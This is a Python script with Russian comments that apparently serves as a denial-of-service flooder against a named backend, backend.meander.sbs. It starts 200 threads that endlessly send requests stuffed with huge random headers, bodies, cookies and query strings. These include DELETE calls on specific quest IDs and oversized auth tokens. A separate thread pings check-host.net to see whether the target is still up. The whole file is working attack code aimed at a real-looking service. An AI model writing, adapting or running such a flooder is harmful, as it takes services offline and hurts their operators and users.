import time
import random
import string
import threading
import requests
import json
from MeanderAPI import client, quests, genres

# Отключаем вывод
def print(*args, **kwargs):
    pass

# === Настройки ===
THREAD_COUNT = 200  # Максимальное количество потоков
BASE_URL = "https://backend.meander.sbs"
CHECK_HOST_URL = "https://check-host.net/check-ping"
CHECK_HOST_TOKEN = "7d73cb5c5b09d8e6ff5b15ab5a25b2835fc0f882"  # Замените при необходимости
TARGET_HOST = "backend.meander.sbs"

# === Генераторы мусора ===
GENRE_LIST = [
    genres.Historical, genres.Adventure, genres.Comedy,
    genres.Thriller, genres.Drama, genres.SciFi,
    genres.Mystery, genres.Horror, genres.Fantasy
]

def random_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))

def random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits + " \t\n\r", k=length))

def huge_headers():
    """Генерирует огромные заголовки (до 50 КБ)"""
    return {
        "X-Spam-Data": random_string(10000),
        "X-Random-Header": random_string(8000),
        "X-Meader-Test": random_string(5000),
        "X-Junk-Data": random_string(10000),
        "X-Large-Header": random_string(15000),
        "User-Agent": f"MeanderAPI-Test/{random.randint(1, 99999)}",
        "X-Request-Id": random_string(500),
        "X-Session-Id": random_string(500),
        "X-Client-Version": random_string(200),
    }

def huge_body():
    """Генерирует огромный JSON-боди (до 100 КБ)"""
    return {
        "title": random_string(2000),
        "description": random_string(10000),
        "author": random_id(),
        "genre": random.choice(GENRE_LIST),
        "tags": [random_string(500) for _ in range(20)],
        "content": random_string(50000),  # 50 КБ текста
        "metadata": {
            "field1": random_string(2000),
            "field2": random_string(2000),
            "field3": random_string(2000),
            "field4": [random_string(500) for _ in range(50)]
        }
    }

# === Функции для check-host.net ===
def start_check_host_ping():
    """Запускает проверку пингов через check-host.net"""
    try:
        url = f"{CHECK_HOST_URL}?host={TARGET_HOST}&csrf_token={CHECK_HOST_TOKEN}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if 'request_id' in data:
                return data['request_id']
    except Exception:
        pass
    return None

def get_check_host_results(request_id):
    """Получает результаты проверки по ID"""
    if not request_id:
        return None
    try:
        url = f"https://check-host.net/check-result/{request_id}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return response.json()
    except Exception:
        pass
    return None

# === Создаём пользователей ===
users = [client.new_guest() for _ in range(THREAD_COUNT)]

# === Список ID для атак ===
QUEST_IDS = [
    "ba0b5e8d-0d4f-4368-af9f-2564bc00c07d",
    "7915972f-92bb-4464-b14d-c1a279cd8a26",
    "27ed560e-6a0f-4e67-bb7b-ce291e89f075",
    "f7e7709b-ce64-4aea-ab65-4d1c11c31756"
]

# === Флаг для check-host потока ===
check_host_trigger = True

# === Воркер для основной нагрузки ===
def worker(thread_id):
    local_user = users[thread_id % len(users)]
    session = requests.Session()
    session.headers.update({"Connection": "close"})
    
    while True:
        try:
            # === 1. Библиотека MeanderAPI ===
            quests.get_quests(local_user)
            quests.get_quests_by_search(
                local_user,
                random_string(1000),
                random.choice(GENRE_LIST),
                random_id()
            )
            for _ in range(10):
                quests.get_quest_by_id(local_user, random.choice(QUEST_IDS))
            for _ in range(5):
                quests.get_quest_by_id(local_user, random_id())
            
            try:
                quests.like(local_user, {"id": random.choice(QUEST_IDS)})
                quests.dislike(local_user, {"id": random.choice(QUEST_IDS)})
            except:
                pass
            
            # === 2. Прямые HTTP-запросы ===
            session.get(BASE_URL + "/", headers=huge_headers(), params={"spam": random_string(2000)}, timeout=0.3)
            session.get(BASE_URL + "/quests", headers=huge_headers(), params={"search": random_string(2000), "genre": random.choice(GENRE_LIST), "random": random_string(1000)}, timeout=0.3)
            session.get(BASE_URL + "/quests/" + random.choice(QUEST_IDS), headers=huge_headers(), timeout=0.3)
            session.post(BASE_URL + "/quests", headers=huge_headers(), json=huge_body(), timeout=0.3)
            session.post(BASE_URL + "/quests/" + random.choice(QUEST_IDS) + "/vote", headers=huge_headers(), json={"action": "set", "is_like": random.choice([True, False])}, timeout=0.3)
            session.post(BASE_URL + "/quests/search", headers=huge_headers(), json={"query": random_string(2000), "genre": random.choice(GENRE_LIST), "author_id": random_id()}, timeout=0.3)
            session.get(BASE_URL + "/quests", headers=huge_headers(), params={"q": random_string(5000)}, timeout=0.3)
            session.post(BASE_URL + "/auth/google/token", headers=huge_headers(), json={"idToken": random_string(20000)}, timeout=0.3)
            session.put(BASE_URL + "/profiles/me", headers=huge_headers(), json={"full_name": random_string(2000), "bio": random_string(10000)}, timeout=0.3)
            session.delete(BASE_URL + "/quests/" + random.choice(QUEST_IDS), headers=huge_headers(), timeout=0.3)
            session.post(BASE_URL + "/quests", headers={**huge_headers(), "Content-Type": "application/xml"}, data=random_string(20000), timeout=0.3)
            
            cookies = {f"cookie_{i}": random_string(500) for i in range(50)}
            session.get(BASE_URL + "/quests", headers=huge_headers(), cookies=cookies, timeout=0.3)
            
            long_url = BASE_URL + "/quests?" + "&".join([f"{random_string(10)}={random_string(100)}" for _ in range(20)])
            session.get(long_url, headers=huge_headers(), timeout=0.3)
            session.post(BASE_URL + "/quests", headers={**huge_headers(), "Content-Type": "application/octet-stream"}, data=random_string(50000), timeout=0.3)
            
        except Exception:
            pass
        
        time.sleep(0.001)

# === Воркер для check-host.net (запускается в отдельном потоке) ===
def check_host_worker():
    global check_host_trigger
    while check_host_trigger:
        try:
            # Запускаем проверку
            request_id = start_check_host_ping()
            if request_id:
                # Ждём немного, пока узлы выполнят проверку
                time.sleep(15)
                # Получаем результаты (опционально, можно не обрабатывать)
                results = get_check_host_results(request_id)
                # Здесь можно добавить обработку результатов, если нужно
        except Exception:
            pass
        # Запускаем проверку каждые 30 секунд
        time.sleep(30)

# === Запуск основных потоков ===
print(f"[+] Запуск {THREAD_COUNT} потоков основной нагрузки...")
threads = []
for i in range(THREAD_COUNT):
    t = threading.Thread(target=worker, args=(i,))
    t.daemon = True
    t.start()
    threads.append(t)
    time.sleep(0.01)

# === Запуск потока для check-host.net ===
print("[+] Запуск потока для check-host.net...")
check_thread = threading.Thread(target=check_host_worker)
check_thread.daemon = True
check_thread.start()

print(f"[+] {THREAD_COUNT} потоков запущено. Нажми Ctrl+C для остановки.")

try:
    while True:
        time.sleep(5)
        print(f"[+] Активных потоков: {threading.active_count()}")
except KeyboardInterrupt:
    print("[+] Остановка...")
    check_host_trigger = False
    time.sleep(1)
